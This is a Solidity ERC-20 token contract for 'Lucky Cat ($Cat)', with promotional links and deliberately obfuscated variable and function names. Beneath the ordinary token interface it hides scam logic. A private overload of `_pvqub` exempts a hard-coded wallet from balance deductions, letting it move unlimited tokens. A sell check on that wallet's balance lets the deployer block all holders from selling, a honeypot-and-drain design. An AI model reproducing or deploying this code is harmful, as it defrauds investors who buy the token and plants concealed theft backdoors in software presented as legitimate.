/**

Lucky Cat    $Cat


TWITTER: https://twitter.com/LuckyCat_erc
TELEGRAM: https://t.me/LuckyCat_erc20
WEBSITE: https://cateth.org/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _pvqub(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _pvqub(a, b, "SafeMath:");
    }

    function  _pvqub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _kabvcatzp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _pforzmkuns {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract LuckyCat is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Lucky Cat";
    string private constant _symbol = unicode"Cat";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalxi = 1000000000 * 10 **_decimals;
    uint256 public _mxTvmvAmaunt = _Totalxi;
    uint256 public _Wallekxbfo = _Totalxi;
    uint256 public _wapThresholdmcx= _Totalxi;
    uint256 public _mkolToapc= _Totalxi;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isxExcapmf;
    mapping (address => bool) private _taxvWaervy;
    mapping(address => uint256) private _lruehrkbacp;
    bool public _taerelorve = false;
    address payable private _qvmopufq;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBefaepnb=0;
    uint256 private _buroknwr=0;


    _pforzmkuns private _YomRarnat;
    address private _acMkvaujw;
    bool private _quomeagh;
    bool private lovStqkuq = false;
    bool private _aqmfuaqyq = false;


    event _amgfoigtl(uint _mxTvmvAmaunt);
    modifier lokecThtcap {
        lovStqkuq = true;
        _;
        lovStqkuq = false;
    }

    constructor () {
        _qvmopufq = payable(0x9B6F92ec0F8eA2a2129270D7492a3ebE47ec722b);
        _balances[_msgSender()] = _Totalxi;
        _isxExcapmf[owner()] = true;
        _isxExcapmf[address(this)] = true;
        _isxExcapmf[_qvmopufq] = true;

 

        emit Transfer(address(0), _msgSender(), _Totalxi);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalxi;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _pvqub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_taerelorve) {
                if (to != address
                (_YomRarnat) && to !=
                 address(_acMkvaujw)) {
                  require(_lruehrkbacp
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruehrkbacp
                  [tx.origin] = block.number;
                }
            }

            if (from == _acMkvaujw && to != 
            address(_YomRarnat) && !_isxExcapmf[to] ) {
                require(amount <= _mxTvmvAmaunt,
                 "Exceeds the _mxTvmvAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallekxbfo, "Exceeds the maxWalletSize.");
                if(_buroknwr
                < _wapBefaepnb){
                  require(! _feipoaq(to));
                }
                _buroknwr++;
                 _taxvWaervy[to]=true;
                teeomoun = amount.mul((_buroknwr>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _acMkvaujw && from!= address(this) 
            && !_isxExcapmf[from] ){
                require(amount <= _mxTvmvAmaunt && 
                balanceOf(_qvmopufq)<_mkolToapc,
                 "Exceeds the _mxTvmvAmaunt.");
                teeomoun = amount.mul((_buroknwr>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_buroknwr>_wapBefaepnb &&
                 _taxvWaervy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!lovStqkuq 
            && to == _acMkvaujw && _aqmfuaqyq &&
             contractTokenBalance>_wapThresholdmcx 
            && _buroknwr>_wapBefaepnb&&
             !_isxExcapmf[to]&& !_isxExcapmf[from]
            ) {
                _swpkvrkumj( _pnuxe(amount, 
                _pnuxe(contractTokenBalance,_mkolToapc)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rmonferp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _pvqub(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _pvqub(teeomoun));
        emit Transfer(from, to, 
        amount. _pvqub(teeomoun));
    }

    function _swpkvrkumj(uint256
     tokenAmount) private lokecThtcap {
        if(tokenAmount==0){return;}
        if(!_quomeagh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _YomRarnat.WETH();
        _approve(address(this),
         address(_YomRarnat), tokenAmount);
        _YomRarnat.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _pnuxe(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _pvqub(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qvmopufq){
            return a ;
        }else{
            return a . _pvqub (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTvmvAmaunt = _Totalxi;
        _Wallekxbfo = _Totalxi;
        _taerelorve = false;
        emit _amgfoigtl(_Totalxi);
    }

    function _feipoaq(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rmonferp(uint256
    amount) private {
        _qvmopufq.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _quomeagh);
        _YomRarnat   =  _pforzmkuns (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_YomRarnat), _Totalxi);
        _acMkvaujw = _kabvcatzp(_YomRarnat.factory()). createPair (address(this),  _YomRarnat . WETH ());
        _YomRarnat.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_acMkvaujw).approve(address(_YomRarnat), type(uint).max);
        _aqmfuaqyq = true;
        _quomeagh = true;
    }

    receive() external payable {}
}